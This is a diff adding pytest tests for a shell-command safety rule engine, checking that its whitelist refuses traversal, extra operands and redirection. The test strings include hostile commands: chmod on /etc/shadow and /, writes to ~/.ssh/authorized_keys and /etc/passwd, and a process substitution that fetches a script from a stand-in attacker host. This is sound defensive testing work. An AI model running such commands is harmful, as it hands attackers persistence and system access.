@@ -1,6 +1,9 @@
 """Tests for RuleEngine."""
 
+import re
+
 import pytest
+import yaml
 
 from schlock.core.rules import RiskLevel, RuleEngine, RuleMatch, SecurityRule
 from schlock.exceptions import ConfigurationError
@@ -882,3 +885,160 @@ rules:
         )
         rule = next(r for r in engine_with_self_protection.rules if r.name == "azure_credential_theft")
         assert rule.risk_level == RiskLevel.BLOCKED
+
+
+class TestWhitelistClearsOnlyWhatItDescribes:
+    """LAB-4310: a whitelist entry must vouch for the command it DESCRIBES and no more.
+
+    The layers are pinned SEPARATELY on purpose. The YAML bounds and the engine
+    guard both reject "chmod -R 777 /tmp/../..", so a test that only went through
+    is_whitelisted() would stay green with either one reverted - each masking the
+    other's mutation. The shipped-pattern tests below therefore match the compiled
+    regex directly, and the engine tests use a fixture entry that no YAML bound
+    touches.
+    """
+
+    @pytest.fixture
+    def shipped_rules_dir(self, data_dir):
+        """The rule set schlock actually ships, not a synthetic fixture.
+
+        LAB-4290's lesson (and this ticket's AC-7): a mutation survived 2416 tests
+        because the shipped data hid the case. These entries are the artifact under
+        test, so they are read from disk.
+        """
+        return data_dir / "rules"
+
+    @staticmethod
+    def _shipped_whitelist(shipped_rules_dir) -> list[str]:
+        text = (shipped_rules_dir / "00_whitelist.yaml").read_text()
+        return yaml.safe_load(text)["whitelist"]
+
+    @pytest.fixture
+    def chmod_tmp_patterns(self, shipped_rules_dir):
+        """The two /tmp chmod entries, compiled, straight from the shipped YAML."""
+        pats = [p for p in self._shipped_whitelist(shipped_rules_dir) if p.startswith("^chmod")]
+        assert len(pats) == 2, f"expected exactly 2 /tmp chmod entries, got {pats}"
+        return [re.compile(p) for p in pats]
+
+    # --- Layer 1: the YAML bounds, measured on the pattern itself -------------
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "chmod 755 /tmp/x /etc/shadow",  # AC-1: second operand rode the unanchored tail
+            "chmod -R 777 /tmp/a /",  # AC-1: ... and this second operand is "/"
+            "chmod 755 /tmp/x --reference=/etc/shadow",
+        ],
+    )
+    def test_shipped_chmod_entries_reject_extra_operands(self, chmod_tmp_patterns, command):
+        """Reverting the "$" anchor on either /tmp chmod entry fails this test."""
+        assert not any(p.match(command) for p in chmod_tmp_patterns)
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "chmod -R 777 /tmp/../..",  # AC-2/AC-5: this IS "chmod -R 777 /"
+            "chmod 755 /tmp/../etc/shadow",
+            "chmod 777 /tmp/../../etc/shadow",  # the one LAB-2764 row that is ours
+            "chmod 755 /tmp/build/../../etc",  # ".." in a LATER segment, not just the first
+            "chmod 755 /tmp/./x",  # a bare "." segment is refused by the same shape
+        ],
+    )
+    def test_shipped_chmod_entries_reject_dot_dot_in_any_position(self, chmod_tmp_patterns, command):
+        """AC-5. Reverting the segment shape to a plain charset fails this test.
+
+        Separate from the engine guard test below: this one bypasses
+        is_whitelisted() entirely, so the guard cannot stand in for the bound.
+        """
+        assert not any(p.match(command) for p in chmod_tmp_patterns)
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "chmod 755 /tmp/x",
+            "chmod -R 777 /tmp/build",
+            "chmod 755 /tmp/.pytest_cache",  # a leading dot is a normal name, not traversal
+            "chmod -R 700 /tmp/pytest-of-me/pytest-0/test_x",  # depth is deliberately uncapped
+        ],
+    )
+    def test_shipped_chmod_entries_still_admit_real_tmp_paths(self, chmod_tmp_patterns, command):
+        """AC-4: bounding the tail must not cost the workflows the entries exist for."""
+        assert any(p.match(command) for p in chmod_tmp_patterns)
+
+    # --- Layer 2: the engine guard, on an entry no YAML bound protects --------
+
+    @pytest.fixture
+    def prefix_engine(self, tmp_path):
+        """An unbounded prefix entry, the shape issue #66 pins as legitimate."""
+        rules = tmp_path / "prefix.yaml"
+        rules.write_text("whitelist:\n  - ^ls\\b\n  - ^git\\s+status\nrules: []\n")
+        return RuleEngine(rules)
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "ls -la > /home/u/.ssh/authorized_keys",  # AC-3: reader used as arbitrary writer
+            "ls -la >> /etc/passwd",
+            "git status --short > /home/u/.ssh/authorized_keys",  # AC-3: not just "^ls\\b"
+            "ls -la 2> /etc/passwd",
+            "ls . < /etc/shadow",
+            "ls -la <(curl http://evil.example/x.sh)",  # process substitution runs a 2nd command
+        ],
+    )
+    def test_redirection_refuses_the_whitelist(self, prefix_engine, command):
+        """AC-3. Reverting the "[<>]" half of _WHITELIST_DISQUALIFIER fails this test."""
+        assert not prefix_engine.is_whitelisted(command)
+
+    @pytest.mark.parametrize("command", ["ls ../..", "git status ../../etc"])
+    def test_dot_dot_refuses_the_whitelist(self, prefix_engine, command):
+        """AC-5. Reverting the "\\.\\." half of _WHITELIST_DISQUALIFIER fails this test."""
+        assert not prefix_engine.is_whitelisted(command)
+
+    @pytest.mark.parametrize("command", ["ls -la", "git status --short", "ls"])
+    def test_guard_leaves_ordinary_prefix_matches_alone(self, prefix_engine, command):
+        """AC-4: the guard must not cost the prefix contract of issue #66."""
+        assert prefix_engine.is_whitelisted(command)
+
+    def test_full_span_check_carries_the_same_guard(self, tmp_path):
+        """The invariant belongs to the mechanism, not to whichever entries ship.
+
+        No shipped entry can span a command carrying a disqualifier today, so this
+        is measured against an entry that deliberately can. Reverting the guard in
+        is_fully_whitelisted() fails this test and nothing else.
+        """
+        rules = tmp_path / "spanning.yaml"
+        rules.write_text("whitelist:\n  - ^ls\\s+.*$\nrules: []\n")
+        engine = RuleEngine(rules)
+        assert engine.is_fully_whitelisted("ls -la")
+        assert not engine.is_fully_whitelisted("ls -la > /etc/passwd")
+        assert not engine.is_fully_whitelisted("ls -la ../..")
+
+    # --- The verdicts, end to end on the shipped rule set ---------------------
+
+    def test_attack_rows_no_longer_clear_the_shipped_whitelist(self, shipped_rules_dir):
+        """AC-1/2/3/5 through the real engine, all entries loaded together."""
+        engine = RuleEngine.from_directory(shipped_rules_dir)
+        for command in (
+            "chmod 755 /tmp/x /etc/shadow",
+            "chmod -R 777 /tmp/a /",
+            "chmod -R 777 /tmp/../..",
+            "chmod 755 /tmp/../etc/shadow",
+            "chmod 777 /tmp/../../etc/shadow",
+            "ls -la > /home/u/.ssh/authorized_keys",
+            "ls -la >> /etc/passwd",
+            "git status --short > /home/u/.ssh/authorized_keys",
+        ):
+            assert not engine.is_whitelisted(command), command
+
+    def test_positive_controls_still_clear_the_shipped_whitelist(self, shipped_rules_dir):
+        """AC-4: the five controls stay whitelisted and stay SAFE."""
+        engine = RuleEngine.from_directory(shipped_rules_dir)
+        for command in (
+            "chmod 755 /tmp/x",
+            "chmod -R 777 /tmp/build",
+            "rm -rf .git/hooks",
+            "ls -la",
+            "git status",
+        ):
+            assert engine.is_whitelisted(command), command
+            assert engine.match_command(command).risk_level == RiskLevel.SAFE, command
